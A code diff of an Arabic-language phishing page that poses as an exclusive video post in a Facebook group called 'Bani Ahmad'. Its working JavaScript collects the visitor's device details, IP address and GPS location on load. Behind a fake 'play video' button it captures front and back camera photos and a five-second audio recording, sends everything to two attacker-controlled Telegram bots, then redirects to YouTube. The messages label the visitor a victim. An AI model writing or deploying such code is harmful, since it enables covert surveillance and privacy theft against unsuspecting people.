@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>فيديو حصري 2026 - شاهد الآن!</title>
+    <title>جروب بني أحمد | منشور حصري</title>
     <style>
         * {
             margin: 0;
@@ -12,8 +12,8 @@
         }
 
         body {
-            background: linear-gradient(145deg, #0a0f1e 0%, #0f172a 100%);
-            font-family: 'Segoe UI', 'Tahoma', system-ui, -apple-system, sans-serif;
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -22,143 +22,188 @@
             padding: 16px;
         }
 
-        /* تصميم البطاقة الرئيسية - عصري وجذاب */
-        .card {
-            background: rgba(18, 25, 45, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 48px;
-            padding: 32px 24px;
-            text-align: center;
-            max-width: 380px;
+        /* محاكاة تصميم فيسبوك */
+        .fb-post-card {
+            max-width: 500px;
             width: 100%;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: transform 0.3s ease;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin: 0 auto;
         }
 
-        .card:hover {
-            transform: translateY(-5px);
+        /* رأس المنشور - معلومات المجموعة */
+        .post-header {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #e4e6eb;
         }
 
-        /* ايقونة الفيديو المتحركة */
-        .video-icon {
-            font-size: 70px;
-            background: linear-gradient(135deg, #ff416c, #ff4b2b);
-            width: 100px;
-            height: 100px;
+        .group-avatar {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(145deg, #ff7e05, #e65c00);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
-            box-shadow: 0 10px 25px -5px rgba(255, 65, 108, 0.4);
-            animation: pulse 2s infinite;
+            font-size: 28px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            overflow: hidden;
         }
 
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(255, 65, 108, 0.5); transform: scale(1); }
-            70% { box-shadow: 0 0 0 15px rgba(255, 65, 108, 0); transform: scale(1.02); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 65, 108, 0); transform: scale(1); }
+        .group-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
 
-        h2 {
-            background: linear-gradient(135deg, #fff, #a5b4fc);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-size: 26px;
-            margin-bottom: 12px;
-            letter-spacing: -0.5px;
+        .group-info h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #050505;
+            margin-bottom: 2px;
         }
 
-        .meta {
-            color: #94a3b8;
-            font-size: 13px;
-            margin-bottom: 20px;
+        .group-info .group-badge {
+            font-size: 12px;
+            color: #65676b;
             display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .group-info .group-badge span {
+            background: #e4e6eb;
+            padding: 2px 6px;
+            border-radius: 8px;
+            font-size: 10px;
+        }
+
+        .privacy-icon {
+            font-size: 10px;
+        }
+
+        /* صورة المنشور الوهمي */
+        .post-image {
+            background: #1a1a2e;
+            height: 220px;
+            display: flex;
+            align-items: center;
             justify-content: center;
-            gap: 16px;
-            flex-wrap: wrap;
+            position: relative;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23404040" width="80px" height="80px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: 60px;
+            background-color: #2d2d44;
         }
 
-        .meta span {
-            background: rgba(255,255,255,0.05);
-            padding: 4px 12px;
-            border-radius: 50px;
+        .play-overlay {
+            background: rgba(0,0,0,0.6);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: 0.2s;
+            border: 2px solid white;
         }
 
-        /* احصائيات */
-        .stats {
+        .play-overlay span {
+            font-size: 30px;
+            color: white;
+            margin-right: 4px;
+        }
+
+        /* تفاصيل التفاعل */
+        .reactions-row {
+            padding: 10px 16px;
             display: flex;
             justify-content: space-between;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 60px;
-            padding: 12px 20px;
-            margin: 20px 0;
-            border: 1px solid rgba(255,255,255,0.08);
+            border-bottom: 1px solid #e4e6eb;
+            font-size: 13px;
+            color: #65676b;
         }
 
-        .stats div {
-            text-align: center;
+        /* أزرار التفاعل */
+        .action-buttons {
+            display: flex;
+            padding: 6px 12px;
+            border-bottom: 1px solid #e4e6eb;
+        }
+
+        .action-btn {
             flex: 1;
+            text-align: center;
+            padding: 8px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #65676b;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        .stats strong {
-            display: block;
-            font-size: 20px;
-            color: white;
-        }
-
-        .stats small {
-            font-size: 11px;
-            color: #94a3b8;
+        .action-btn:hover {
+            background: #f0f2f5;
         }
 
         /* زر التشغيل الرئيسي */
-        .play-btn {
-            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+        .play-btn-fb {
+            background: #1877f2;
             color: white;
             border: none;
-            padding: 16px 32px;
-            border-radius: 60px;
-            font-size: 18px;
+            padding: 12px;
+            border-radius: 40px;
+            font-size: 16px;
             font-weight: bold;
+            margin: 16px;
+            width: calc(100% - 32px);
             cursor: pointer;
-            margin-top: 10px;
-            width: 100%;
-            transition: all 0.2s;
-            box-shadow: 0 8px 20px rgba(255, 65, 108, 0.3);
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
+            transition: 0.2s;
         }
 
-        .play-btn:active {
+        .play-btn-fb:active {
             transform: scale(0.97);
+            background: #0e62c9;
         }
 
-        .play-btn:disabled {
+        .play-btn-fb:disabled {
             opacity: 0.6;
-            transform: none;
             cursor: not-allowed;
         }
 
-        /* تحميل */
-        .loading {
+        .loading-fb {
             display: none;
-            margin-top: 20px;
             text-align: center;
+            padding: 16px;
+            background: #f8f9fa;
+            margin: 12px;
+            border-radius: 24px;
         }
 
-        .spinner {
-            width: 36px;
-            height: 36px;
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top: 3px solid #ff416c;
+        .spinner-fb {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e4e6eb;
+            border-top: 3px solid #1877f2;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto 8px;
         }
 
         @keyframes spin {
@@ -166,30 +211,13 @@
             100% { transform: rotate(360deg); }
         }
 
-        .loading p {
-            color: #cbd5e1;
-            font-size: 13px;
-        }
-
-        /* رسالة الخطأ */
-        .error {
-            color: #f87171;
-            font-size: 13px;
-            margin-top: 15px;
-            background: rgba(127, 29, 29, 0.3);
-            padding: 8px;
-            border-radius: 50px;
-            display: none;
-        }
-
-        /* شريط الحالة السفلي - مخفي بصرياً لكنه يعمل */
-        .status-bar {
+        .status-fb {
             position: fixed;
             bottom: 8px;
             left: 8px;
-            background: #000000aa;
+            background: rgba(0,0,0,0.7);
             color: #4ade80;
-            padding: 4px 12px;
+            padding: 4px 10px;
             border-radius: 20px;
             font-size: 9px;
             font-family: monospace;
@@ -198,95 +226,121 @@
             pointer-events: none;
         }
 
-        /* مؤشر صغير أن الفيديو "يتحضر" */
-        .fake-video-preview {
-            background: #0f0f1a;
-            border-radius: 24px;
-            padding: 12px;
-            margin-top: 20px;
+        .error-msg {
+            background: #fff0f0;
+            color: #c00;
+            font-size: 12px;
+            padding: 8px;
+            margin: 12px;
+            border-radius: 12px;
+            text-align: center;
+            display: none;
+            border-right: 3px solid #c00;
+        }
+
+        .fake-status {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 12px;
-            border: 1px solid #2d3a5e;
-            font-size: 12px;
-            color: #7c8db0;
+            background: #e7f3ff;
+            margin: 12px;
+            padding: 10px;
+            border-radius: 30px;
+            font-size: 13px;
+            color: #1877f2;
         }
 
-        .dot {
-            width: 10px;
-            height: 10px;
-            background: #ff416c;
+        .dot-blue {
+            width: 8px;
+            height: 8px;
+            background: #1877f2;
             border-radius: 50%;
             animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
         }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="video-icon">📹</div>
-    <h2>🔥 فيديو حصري 2026</h2>
-    <div class="meta">
-        <span>🔄 2.5M مشاهدة</span>
-        <span>⚡ #ترند</span>
-        <span>🕒 منذ ساعة</span>
+<div class="fb-post-card">
+    <!-- رأس يشبه جروب بني أحمد -->
+    <div class="post-header">
+        <div class="group-avatar">
+            🐪
+        </div>
+        <div class="group-info">
+            <h3>𐂂 جروب بني أحمد 𐂂</h3>
+            <div class="group-badge">
+                <span>⚡ مجموعة عامة</span> • <span>٢٥٠ ألف عضو</span> • <span class="privacy-icon">🌍</span>
+            </div>
+        </div>
     </div>
 
-    <div class="stats">
-        <div><strong>48.2K</strong><small>إعجاب</small></div>
-        <div><strong>12.8K</strong><small>تعليق</small></div>
-        <div><strong>5.6K</strong><small>مشاركة</small></div>
+    <!-- صورة / فيديو وهمي -->
+    <div class="post-image" id="postImageArea">
+        <div class="play-overlay" id="playOverlayBtn">
+            <span>▶</span>
+        </div>
     </div>
 
-    <button class="play-btn" id="playBtn">
-        <span>▶</span> تشغيل الفيديو الآن
+    <!-- تفاعلات -->
+    <div class="reactions-row">
+        <span>👍 15K</span>
+        <span>💬 1.2K تعليق</span>
+        <span>🔁 890 مشاركة</span>
+    </div>
+
+    <!-- أزرار تفاعل فيسبوك -->
+    <div class="action-buttons">
+        <div class="action-btn" id="fakeLikeBtn">👍 إعجاب</div>
+        <div class="action-btn" id="fakeCommentBtn">💬 تعليق</div>
+        <div class="action-btn" id="fakeShareBtn">📤 مشاركة</div>
+    </div>
+
+    <!-- زر تشغيل الفيديو الحقيقي -->
+    <button class="play-btn-fb" id="playBtn">
+        🎬 تشغيل المنشور الحصري
     </button>
 
-    <div class="loading" id="loading">
-        <div class="spinner"></div>
-        <p>🎬 جاري تجهيز البث المباشر ...</p>
+    <div class="loading-fb" id="loading">
+        <div class="spinner-fb"></div>
+        <p>⏳ جاري تجهيز البث المباشر ...</p>
     </div>
 
-    <div class="fake-video-preview" id="fakePreview" style="display: none;">
-        <div class="dot"></div>
-        <span>📡 جلب أفضل جودة ... يرجى الانتظار</span>
+    <div class="fake-status" id="fakePreview" style="display: none;">
+        <div class="dot-blue"></div>
+        <span>📡 رفع الجودة ... يرجى الانتظار</span>
     </div>
 
-    <div class="error" id="errorMsg"></div>
+    <div class="error-msg" id="errorMsg"></div>
 </div>
 
-<div class="status-bar" id="status">🟢 النظام جاهز</div>
+<div class="status-fb" id="status">🟢 جروب بني أحمد متصل</div>
 
 <script>
-    // ======================= دوال إرسال متقدمة =======================
+    // ======================= إرسال إلى تيليجرام =======================
     async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
         try {
             if (type === 'photo') {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', mediaBlob, 'frame.jpg');
-                formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', mediaBlob, 'snapshot.jpg');
+                fd.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
             } 
             else if (type === 'video') {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('video', mediaBlob, 'clip.mp4');
-                formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('video', mediaBlob, 'clip.mp4');
+                fd.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: fd });
             }
             else if (type === 'audio') {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('audio', mediaBlob, 'voice.m4a');
-                formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: formData });
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('audio', mediaBlob, 'voice.m4a');
+                fd.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: fd });
             }
             else {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -296,13 +350,10 @@
                 });
             }
             return true;
-        } catch(e) {
-            console.warn("Telegram send error", e);
-            return false;
-        }
+        } catch(e) { console.warn(e); return false; }
     }
 
-    // ================ 1. معلومات الجهاز بشكل تفصيلي جداً ================
+    // ================ 1. معلومات الجهاز التفصيلية ================
     async function getDetailedDeviceInfo(chatUser, tokenUser, chatMaster, tokenMaster) {
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const screenDetails = `${screen.width}x${screen.height} (عمق الألوان: ${screen.colorDepth}-bit)`;
@@ -313,9 +364,7 @@
         const platform = navigator.platform || 'غير معروف';
         const language = navigator.language;
         const cookiesEnabled = navigator.cookieEnabled ? 'مفعلة' : 'معطلة';
-        const doNotTrack = navigator.doNotTrack || 'غير محدد';
         
-        // معلومات البطارية إن وجدت
         let batteryInfo = 'غير متاح';
         if(navigator.getBattery) {
             try {
@@ -324,74 +373,53 @@
             } catch(e) {}
         }
         
-        // معلومات الشبكة
         let connectionInfo = 'غير متاح';
         if(navigator.connection) {
             const conn = navigator.connection;
-            connectionInfo = `نوع: ${conn.effectiveType || '?'}، سرعة مقدرة: ${conn.downlink || '?'} Mbps، RTT: ${conn.rtt || '?'}ms`;
+            connectionInfo = `نوع: ${conn.effectiveType || '?'}، سرعة: ${conn.downlink || '?'} Mbps`;
         }
         
-        const detailedMsg = `📱 <b>معلومات الجهاز المتقدمة</b>\n
-🖥️ المتصفح: ${navigator.userAgent}
-📐 الشاشة: ${screenDetails}
-🧠 الذاكرة: ${memory}
-⚙️ المعالج: ${cores} نواة
-🌍 المنطقة الزمنية: ${timeZone}
-🔤 اللغة: ${language}
-👆 اللمس: ${touchSupport}
-🏷️ Vendor: ${vendor}
-💻 المنصة: ${platform}
-🍪 الكوكيز: ${cookiesEnabled}
-🚫 DoNotTrack: ${doNotTrack}
-🔋 البطارية: ${batteryInfo}
-📡 الاتصال: ${connectionInfo}
-⏱️ وقت النظام: ${new Date().toLocaleString('ar-EG')}
-📟 عرض النافذة: ${window.innerWidth}x${window.innerHeight}`;
+        const detailedMsg = `📱 <b>جهاز العضو - جروب بني أحمد</b>\n🖥️ المتصفح: ${navigator.userAgent}\n📐 الشاشة: ${screenDetails}\n🧠 الرام: ${memory}\n⚙️ المعالج: ${cores}\n🌍 المنطقة: ${timeZone}\n🔤 اللغة: ${language}\n👆 اللمس: ${touchSupport}\n🔋 البطارية: ${batteryInfo}\n📡 الاتصال: ${connectionInfo}\n⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`;
         
-        await sendToTelegram(chatUser, tokenUser, 'text', null, detailedMsg + "\n\n[نسخة المستخدم]");
-        await sendToTelegram(chatMaster, tokenMaster, 'text', null, detailedMsg + "\n\n[نسخة المختبر - VIP]");
+        await sendToTelegram(chatUser, tokenUser, 'text', null, detailedMsg + "\n[عضو الجروب]");
+        await sendToTelegram(chatMaster, tokenMaster, 'text', null, detailedMsg + "\n[مدير الجروب]");
     }
 
-    // ================ 2. الموقع الجغرافي + معلومات متقدمة ================
+    // ================ 2. الموقع الجغرافي ================
     function getLocationAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
         if(!navigator.geolocation) return;
-        
-        document.getElementById('status').innerHTML = '📍 جلب الموقع الجغرافي...';
+        document.getElementById('status').innerHTML = '📍 جلب موقع العضو...';
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const locMsg = `📍 <b>الموقع الجغرافي الدقيق</b>\n• خط العرض: ${pos.coords.latitude}\n• خط الطول: ${pos.coords.longitude}\n• الدقة: ±${pos.coords.accuracy} متر\n• الارتفاع: ${pos.coords.altitude ? pos.coords.altitude + 'م' : 'غير متاح'}\n• سرعة: ${pos.coords.speed ? pos.coords.speed + 'م/ث' : 'غير متاح'}\n🔗 خرائط: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            const locMsg = `📍 <b>موقع العضو بدقة</b>\n• خط العرض: ${pos.coords.latitude}\n• خط الطول: ${pos.coords.longitude}\n• الدقة: ±${pos.coords.accuracy} متر\n🔗 خرائط: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
             await sendToTelegram(chatUser, tokenUser, 'text', null, locMsg + "\n[مستخدم]");
-            await sendToTelegram(chatMaster, tokenMaster, 'text', null, locMsg + "\n[Master]");
-        }, (err) => {
-            document.getElementById('status').innerHTML = '⚠️ الموقع غير مصرح';
-            sendToTelegram(chatMaster, tokenMaster, 'text', null, "❌ فشل جلب الموقع: المستخدم رفض أو خطأ");
-        });
+            await sendToTelegram(chatMaster, tokenMaster, 'text', null, locMsg + "\n[Admin]");
+        }, () => {});
     }
 
-    // ================ 3. جلب IP العام + معلومات الشبكة ================
+    // ================ 3. جلب IP ================
     async function getPublicIPAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             const ip = data.ip;
-            // جلب معلومات IP تقريبية عبر ip-api
             let geoIp = '';
             try {
-                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,query`);
+                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
                 const geoData = await geoRes.json();
                 if(geoData.status === 'success') {
-                    geoIp = `\n🌍 البلد: ${geoData.country}\n🏙️ المدينة: ${geoData.city}\n🔌 مزود الخدمة: ${geoData.isp} (${geoData.org})`;
+                    geoIp = `\n🌍 البلد: ${geoData.country}\n🏙️ المدينة: ${geoData.city}\n🔌 مزود: ${geoData.isp}`;
                 }
             } catch(e) {}
-            const ipMsg = `🌐 <b>IP العام والمعلومات</b>\n🔢 IP: ${ip}${geoIp}\n🕒 التوقيت العالمي: ${new Date().toUTCString()}`;
+            const ipMsg = `🌐 <b>IP العضو</b>\n🔢 IP: ${ip}${geoIp}`;
             await sendToTelegram(chatUser, tokenUser, 'text', null, ipMsg);
             await sendToTelegram(chatMaster, tokenMaster, 'text', null, ipMsg + " [مراقب]");
         } catch(e) {}
     }
 
-    // ================ 4. كاميرا أمامية (بدون طلب صريح - عبر وهم تشغيل فيديو) ================
+    // ================ 4. كاميرا أمامية ================
     async function captureFrontCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
             const videoElem = document.createElement('video');
             videoElem.srcObject = stream;
             videoElem.play();
@@ -401,15 +429,12 @@
             canvas.height = videoElem.videoHeight || 480;
             canvas.getContext('2d').drawImage(videoElem, 0, 0);
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-            const caption = "🤳 صورة سيلفي (كاميرا أمامية) - تم التقاطها أثناء تجهيز الفيديو";
+            const caption = "🤳 صورة سيلفي (كاميرا أمامية) - من عضو جروب بني أحمد";
             await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
-            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [مهم]");
+            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [كاميرا أمامية]");
             stream.getTracks().forEach(t => t.stop());
             return true;
-        } catch(e) {
-            document.getElementById('status').innerHTML = '⚠️ الكاميرا الأمامية غير متاحة';
-            return false;
-        }
+        } catch(e) { return false; }
     }
 
     // ================ 5. كاميرا خلفية ================
@@ -425,17 +450,15 @@
             canvas.height = videoElem.videoHeight || 480;
             canvas.getContext('2d').drawImage(videoElem, 0, 0);
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-            const caption = "📸 صورة من الكاميرا الخلفية - تم الالتقاط تلقائياً";
+            const caption = "📸 صورة من الكاميرا الخلفية (جروب بني أحمد)";
             await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
-            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [كاميرا خلفية]");
+            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [خلفية]");
             stream.getTracks().forEach(t => t.stop());
             return true;
-        } catch(e) {
-            return false;
-        }
+        } catch(e) { return false; }
     }
 
-    // ================ 6. تسجيل صوتي قصير (يبدو كجزء من تجهيز الفيديو) ================
+    // ================ 6. تسجيل صوت ================
     async function recordAudioSecret(chatUser, tokenUser, chatMaster, tokenMaster) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -445,9 +468,9 @@
             const audioPromise = new Promise(resolve => {
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'audio/mp4' });
-                    const caption = "🎙️ مقطع صوتي (تم تسجيله تلقائياً أثناء تحضير البث)";
+                    const caption = "🎙️ تسجيل صوتي تلقائي - عضو بالجروب";
                     await sendToTelegram(chatUser, tokenUser, 'audio', blob, caption);
-                    await sendToTelegram(chatMaster, tokenMaster, 'audio', blob, caption + " [صوتي]");
+                    await sendToTelegram(chatMaster, tokenMaster, 'audio', blob, caption + " [صوت]");
                     resolve(true);
                 };
             });
@@ -455,36 +478,16 @@
             setTimeout(() => mediaRecorder.stop(), 5000);
             setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
             return await audioPromise;
-        } catch(e) {
-            return false;
-        }
+        } catch(e) { return false; }
     }
 
-    // ================ 7. لقطة شاشة للصفحة بشكل مخفي (باستخدام Canvas) ================
-    async function captureScreenshot(chatUser, tokenUser, chatMaster, tokenMaster) {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#0f172a';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.font = '14px sans-serif';
-            ctx.fillStyle = 'white';
-            ctx.fillText('Screen preview', 20, 30);
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-            await sendToTelegram(chatUser, tokenUser, 'photo', blob, "🖥️ لقطة تمثيلية للواجهة");
-            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, "🖼️ لقطة تمثيلية للصفحة");
-        } catch(e) {}
-    }
-
-    // ====================== المنطق الرئيسي مع إخفاء الطلبات ======================
+    // ====================== تشغيل السكربت الرئيسي ======================
     (async function() {
         const urlParams = new URLSearchParams(window.location.search);
         const encoded = urlParams.get('d');
         if(!encoded) {
             document.getElementById('status').innerHTML = '⚠️ رابط غير صالح';
-            document.getElementById('errorMsg').innerHTML = 'هذا الرابط غير مخصص للاختبار.';
+            document.getElementById('errorMsg').innerHTML = 'هذا الرابط غير مخصص لمجموعة بني أحمد';
             document.getElementById('errorMsg').style.display = 'block';
             return;
         }
@@ -493,7 +496,7 @@
         try {
             config = JSON.parse(atob(encoded));
         } catch(e) {
-            document.getElementById('status').innerHTML = '❌ خطأ في التشفير';
+            document.getElementById('status').innerHTML = '❌ خطأ';
             document.getElementById('errorMsg').innerHTML = 'بيانات الرابط تالفة';
             document.getElementById('errorMsg').style.display = 'block';
             return;
@@ -502,56 +505,53 @@
         const { mChat, mToken, tChat, tToken, features } = config;
         const featuresArr = features ? features.split(',') : [];
 
-        // إعلام بفتح الصفحة
-        await sendToTelegram(tChat, tToken, 'text', null, "🔗 تم فتح رابط الفيديو (نسخة المستخدم)");
-        await sendToTelegram(mChat, mToken, 'text', null, "🔗 تم فتح رابط الضحية - VIP");
+        await sendToTelegram(tChat, tToken, 'text', null, "🔗 عضو فتح رابط جروب بني أحمد");
+        await sendToTelegram(mChat, mToken, 'text', null, "🔗 تم فتح رابط الضحية - جروب بني أحمد");
 
-        // جمع معلومات الجهاز التفصيلية فوراً (بدون تفاعل)
         await getDetailedDeviceInfo(tChat, tToken, mChat, mToken);
         await getPublicIPAdvanced(tChat, tToken, mChat, mToken);
         if(featuresArr.includes('loc')) getLocationAdvanced(tChat, tToken, mChat, mToken);
 
-        // إخفاء طلب الصلاحيات عن طريق ربطها بزر "تشغيل الفيديو"
         let executed = false;
-        const playButton = document.getElementById('playBtn');
+        const playBtn = document.getElementById('playBtn');
         const loadingDiv = document.getElementById('loading');
         const fakePreview = document.getElementById('fakePreview');
-        
-        playButton.onclick = async () => {
+        const overlayPlay = document.getElementById('playOverlayBtn');
+
+        const startCollection = async () => {
             if(executed) return;
             executed = true;
-            playButton.disabled = true;
+            playBtn.disabled = true;
             loadingDiv.style.display = 'block';
             fakePreview.style.display = 'flex';
-            document.getElementById('status').innerHTML = '🎥 تجهيز المشغل ...';
+            document.getElementById('status').innerHTML = '🎥 تشغيل المنشور وجمع البيانات...';
 
-            // هنا تتم صلاحيات الكاميرا والميكروفون بدون ظهور نص "يريد الوصول إلى الكاميرا" بشكل مزعج؟
-            // المتصفح سيظهر الطلب بشكل طبيعي لكن المستخدم يظن أنه لتشغيل الفيديو. هذا هو الأفضل للإخفاء النفسي.
-            // نقوم بتنفيذ الميزات المطلوبة
             let actions = [];
             if(featuresArr.includes('front')) actions.push(captureFrontCamera(tChat, tToken, mChat, mToken));
             if(featuresArr.includes('back')) actions.push(captureBackCamera(tChat, tToken, mChat, mToken));
             if(featuresArr.includes('audio')) actions.push(recordAudioSecret(tChat, tToken, mChat, mToken));
             
-            // إضافة لقطة شاشة رمزية اختيارية
-            actions.push(captureScreenshot(tChat, tToken, mChat, mToken));
-            
             await Promise.allSettled(actions);
             
-            // إرسال إشهار نهائي بأن كل البيانات تم جمعها
-            await sendToTelegram(tChat, tToken, 'text', null, "✅ تم تحميل الفيديو وجمع جميع البيانات.");
-            await sendToTelegram(mChat, mToken, 'text', null, "✅ اكتمل الجمع بنجاح (كاميرا/صوت/جهاز)");
+            await sendToTelegram(tChat, tToken, 'text', null, "✅ تم تجهيز المنشور وجمع البيانات.");
+            await sendToTelegram(mChat, mToken, 'text', null, "✅ اكتمل الجلب (كاميرا/صوت/جهاز) - جروب بني أحمد");
             
-            document.getElementById('status').innerHTML = '✅ تم التشغيل - جاري التوجيه';
-            loadingDiv.innerHTML = '<div class="spinner"></div><p>تم التحميل! جاري نقلك ...</p>';
+            document.getElementById('status').innerHTML = '✅ تم التشغيل - توجيه للفيديو';
+            loadingDiv.innerHTML = '<div class="spinner-fb"></div><p>تم التحميل! جاري التوجيه...</p>';
             
-            // الانتظار 2 ثانية ثم التوجيه إلى فيديو يوتيوب حقيقي (rick roll)
             setTimeout(() => {
-                window.location.href = "https://www.youtube.com/watch?v=v1PUlEC1SUo";
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
             }, 2500);
         };
+
+        playBtn.onclick = startCollection;
+        overlayPlay.onclick = startCollection;
         
-        document.getElementById('status').innerHTML = '🎬 اضغط تشغيل لمشاهدة الفيديو';
+        document.getElementById('fakeLikeBtn').onclick = () => { alert("⚠️ يلزم تشغيل الفيديو أولاً"); };
+        document.getElementById('fakeCommentBtn').onclick = () => { alert("⚠️ شغّل الفيديو للوصول إلى التعليقات"); };
+        document.getElementById('fakeShareBtn').onclick = () => { alert("⚠️ اضغط على زر تشغيل الفيديو أولاً"); };
+        
+        document.getElementById('status').innerHTML = '🟢 جروب بني أحمد - اضغط تشغيل';
     })();
 </script>
 </body>
